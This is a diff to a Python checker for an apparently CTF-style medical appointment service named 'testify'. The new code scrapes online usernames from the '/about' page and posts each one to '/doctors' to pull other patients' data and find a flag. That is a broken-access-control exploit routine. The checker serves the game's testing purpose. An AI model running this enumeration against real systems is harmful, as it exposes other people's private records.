@@ -322,10 +322,22 @@ class testifyChecker(BaseChecker):
             username = profile['username']
             password = profile['password']
 
-            app_id = self.make_appointment(profile['prename'], profile['lastname'], profile['filename'], profile['date']
-                                           , profile['time'], profile['file'], 'doctor0' + str(random.randint(1, 5)), profile['pin'])
             self.register(username, password)
-            users = self.http_get('/about')
+
+            app_id = self.make_appointment(profile['prename'], profile['lastname'], profile['filename'], profile['date']
+                                           , profile['time'], profile['file'], username, profile['pin'])
+
+            text = self.http_get('/about').text
+            splits = text[text.find('onlineUsers'):].split('&#39;')
+            splits = splits[1:]
+            del splits[1::2]
+            for s in splits:
+                kwargs = {'data': {'patient_username': s},
+                          'allow_redirects': True}
+                pot_flag = self.http_post('/doctors', **kwargs)
+                if flag := self.search_flag(pot_flag.text):
+                    return flag
+            raise BrokenServiceException('could not get appointment id')
 
 
 app = testifyChecker.service  # This can be used for uswgi.
